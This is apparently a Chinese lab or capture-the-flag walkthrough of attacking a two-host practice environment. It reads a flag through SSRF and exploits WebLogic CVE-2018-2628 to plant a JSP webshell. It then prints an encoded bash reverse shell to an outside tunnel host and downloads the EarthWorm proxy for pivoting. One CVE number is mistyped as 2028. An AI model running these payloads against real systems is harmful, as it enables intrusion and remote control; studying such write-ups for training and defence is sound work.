# web1

该环境有2台主机，第一台主机访问地址为：119.45.254.3:80（备用地址：175.27.230.88:80），剩余一台主机需要各位进行可能的内网代理、端口转发等操作进行发现和渗透。 当前FLAG信息如下： flag1：在第一台主机的根目录，分数为：50分。 内网范围在：172.18.240.0/24

登上网页，一个爬取快照功能，可以输入url网址。首先想到SSRF，直接尝试file协议`file:///flag`成功获取flag:

```
meetsec-web1{flag1-6d5e5c2bb397ba7727b58df59b35f66a}
```

`nmap  xxx  -sC -sV -v`先扫一下：

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:63:b7:5f:ca:0c:4c:4c:8c:65:de:ca:e1:4e:bf:db (RSA)
|   256 8f:f2:9d:1a:5a:70:ec:aa:06:85:d8:2f:21:9a:97:26 (ECDSA)
|_  256 40:7d:fa:fe:8f:f9:23:c6:ad:0f:a4:01:f8:95:17:e9 (ED25519)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Hello!
|_http-favicon: Unknown favicon MD5: 985ADF895E812B5C0CCBD677E25BF426
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7001/tcp  open  http    Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)
|_http-title: Error 404--Not Found
8081/tcp  open  http    Apache Tomcat 11.0.11
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/11.0.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8082/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: BEES\xE4\xBC\x81\xE4\xB8\x9A\xE7\xBD\x91\xE7\xAB\x99\xE7\xAE\xA1\xE7\x90\x86\xE7\xB3\xBB\xE7\xBB\x9F_\xE4\xBC\x81\xE4\xB8\x9A\xE5\xBB\xBA\xE7\xAB\x99\xE7\xB3\xBB\xE7\xBB\x9F_\xE5\xA4\x96\xE8\xB4\xB8\xE7\xBD\x91\xE7\xAB\x99\xE5\xBB...
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 6 disallowed entries 
| /install/ /data/ /includes/ /languages/ /member/ 
|_/template/
|_http-server-header: Apache/2.4.7 (Ubuntu)
58080/tcp open  http    Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Login Page
|_Requested resource was http://175.27.230.88:58080/login;jsessionid=B99F19236BEF57695D582B87B97AB105
|_http-favicon: Unknown favicon MD5: F2FEC6E35703AC01565B8241C36BEA1C
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

看到`weblogic-t3-info: T3 protocol in use`想到CVE-2028-2628

这里直接用WeblogicScan工具扫了:

```
Welcome To WeblogicScan !!!
Whoami：https://github.com/rabbitmask
[*] =========Task Start=========
[+] [175.27.230.88:7001] Weblogic Version Is 10.3.6.0
[+] [175.27.230.88:7001] Weblogic console address is exposed! The path is: http://175.27.230.88:7001/console/login/LoginForm.jsp
[+] [175.27.230.88:7001] Weblogic UDDI module is exposed! The path is: http://175.27.230.88:7001/uddiexplorer/
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2016-0638
[-] [175.27.230.88:7001] weblogic not detected CVE-2016-3510
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2017-10271
[-] [175.27.230.88:7001] weblogic not detected CVE-2017-3248
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2017-3506
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2018-2628
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2018-2893
[-] [175.27.230.88:7001] weblogic not detected CVE-2018-2894
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2729
[+] [175.27.230.88:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2890
```

可以看到CVE-2018-2628确实存在，别的我们不管。

为了利用简单，选择一个上传webshell的payload

https://github.com/jas502n/CVE-2018-2628

```
┌──(root㉿kali)-[/home/orange/my_tools/weblogic/CVE-2018-2628]
└─# python2 CVE-2018-2628-Getshell.py  175.27.230.88 7001 123456.jsp

   _______      ________    ___   ___  __  ___      ___   __ ___   ___  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |__ \ / /|__ \ / _ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |_____ ) / /_   ) | (_) |
 | |      \ \/ / |  __|______/ /| | | || |> _ <______/ / '_ \ / / > _ < 
 | |____   \  /  | |____    / /_| |_| || | (_) |    / /| (_) / /_| (_) |
  \_____|   \/   |______|  |____|\___/ |_|\___/    |____\___/____|\___/ 
                                                                        
                                                                        
                          Weblogic Getshell 
                                jas502n            


handshake successful


 >>>>usage: python cve-2018-2628.py ip port shell1.jsp 



>>>Shell File Upload Dir: 

servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\123456.jsp


>>>Getshell: http://175.27.230.88:7001/bea_wls_internal/123456.jsp?tom=d2hvYW1pCg==
```

注意这里最后上传的jsp文件名总共要是是个字符，因为payload长度在脚本中是硬编码好的，不能修改。

根据提示访问`bea_wls_internal/123456.jsp?tom=d2hvYW1pCg==`,出现`|->root<-|`字样。这里的root是url参数tom后的指令的结果。`d2hvYW1pCg==`是`whoami`的编码。

直接反弹shell即可，因为webshell中是直接Runtime.exec()我们的payload不能有管道符重定向符等，要base64编码。还有一点是我这里没有公网ip，使用的是coplar内网穿透工具。

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMS50Y3AudmlwLmNwb2xhci5jbi8xMDI4NiAwPiYx}|{base64,-d}|{bash,-i}
```

上面的指令还要进行一次base64编码，放入参数tom中，然后访问，成功拿到shell！

```
└─# nc -lvp 2333
listening on [any] 2333 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 35882
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@1718031e184e:~/Oracle/Middleware/user_projects/domains/base_domain# 
```

同样使用coplar，本地使用`python -m http.server 8080`开启web服务，靶机上使用wget下载`EarthWorm`代理工具：

```
wget http://55932df8.r16.vip.cpolar.cn/ew_for_linux64
```

因为本机是可以出网的，我们直接使用正向代理即可：

```
root@1718031e184e:~# ./ew_for_linux64 -s ssocksd -l 8888 2>/dev/null &
./ew_for_linux64 -s ssocksd -l 8888 2>/dev/null &
[1] 200
root@1718031e184e:~# netstat -tulnp | grep 8888
netstat -tulnp | grep 8888
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      200/ew_for_linux64
```

netstat可以检查一下有没有正常工作。

因为这里遇到进程是不是被挂断，使用nohup指令：

```
nohup ./ew_for_linux64 -s ssocksd -l 8888 > ew.log 2>&1 &
```

kali上需要使用`proxychains`来让其他程序的流量走这个代理

现在问题就在这里，代理走不通，扫nmap内网0-255全都存活

几个问题：

1. proxychains填谁的代理？按道理是目标靶机的代理。但是我们因为没有公网IP又用cpolar进行了一次穿透。
2. 这里环境看不明白，为什么都是一个IP？不同服务进去flag不一样？

最后是试试MSF的代理功能。

多尝试用MSF
